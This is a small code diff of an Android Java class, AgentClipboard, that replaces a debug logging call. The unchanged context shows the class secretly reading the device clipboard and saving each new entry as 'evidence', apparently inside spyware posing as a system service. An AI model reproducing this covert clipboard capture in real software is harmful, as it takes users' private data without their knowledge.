@@ -13,7 +13,6 @@ import java.util.ArrayList;
 
 import android.content.Context;
 import android.text.ClipboardManager;
-import android.util.Log;
 
 import com.android.service.LogR;
 import com.android.service.Status;
@@ -42,7 +41,7 @@ public class AgentClipboard extends AgentBase {
 
 		String ret = clipboardManager.getText().toString();
 		if (ret != null && !ret.equals(lastClip)) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): captured " + ret);
+			if(Cfg.DEBUG) Check.log( TAG + " (go): captured " + ret);
 			saveEvidence(ret);
 			lastClip = ret;
 		}
